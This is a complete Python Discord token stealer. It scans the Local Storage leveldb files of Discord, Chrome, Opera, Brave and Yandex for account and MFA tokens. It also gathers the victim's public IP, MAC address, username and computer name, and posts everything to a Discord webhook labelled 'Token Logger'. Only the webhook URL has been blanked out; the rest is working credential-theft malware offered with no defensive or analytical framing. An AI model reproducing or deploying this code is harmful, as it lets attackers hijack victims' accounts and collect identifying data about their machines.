import os
import re
import json
import base64
import sqlite3
import shutil
import requests
from urllib.request import Request, urlopen
from uuid import getnode as get_mac

WEBHOOK = "https://discord.com/api/webhooks/..."  # rimosso per sicurezza

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def gettokens(path):
    tokens = []
    path += "\\Local Storage\\leveldb"
    if not os.path.exists(path):
        return tokens
    for filename in os.listdir(path):
        if not filename.endswith((".log", ".ldb")):
            continue
        with open(os.path.join(path, filename), errors="ignore") as f:
            for line in f:
                for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", line):
                    tokens.append(token)
                for token in re.findall(r"mfa\.[\w-]{84}", line):
                    tokens.append(token)
    return tokens

def getip():
    try:
        return requests.get("https://api.ipify.org").text
    except:
        return "N/A"

def main():
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")

    paths = {
        "Discord": os.path.join(roaming, "Discord"),
        "Discord Canary": os.path.join(roaming, "discordcanary"),
        "Discord PTB": os.path.join(roaming, "discordptb"),
        "Google Chrome": os.path.join(local, "Google\\Chrome\\User Data\\Default"),
        "Opera": os.path.join(roaming, "Opera Software\\Opera Stable"),
        "Brave": os.path.join(local, "BraveSoftware\\Brave-Browser\\User Data\\Default"),
        "Yandex": os.path.join(local, "Yandex\\YandexBrowser\\User Data\\Default")
    }

    ip = getip()
    mac = hex(get_mac())
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")

    embeds = []

    for platform, path in paths.items():
        tokens = gettokens(path)
        if not tokens:
            continue
        for token in tokens:
            embed = {
                "title": "Token Found",
                "fields": [
                    {"name": "Platform", "value": platform, "inline": True},
                    {"name": "Token", "value": token, "inline": False},
                    {"name": "IP", "value": ip, "inline": True},
                    {"name": "MAC", "value": mac, "inline": True},
                    {"name": "User", "value": pc_username, "inline": True},
                    {"name": "PC Name", "value": pc_name, "inline": True}
                ]
            }
            embeds.append(embed)

    if embeds:
        payload = {
            "embeds": embeds,
            "username": "Token Logger",
            "avatar_url": "https://i.imgur.com/4M34hi2.png"
        }
        try:
            urlopen(Request(WEBHOOK, data=json.dumps(payload).encode(), headers=getheaders()))
        except:
            pass

if __name__ == "__main__":
    main()
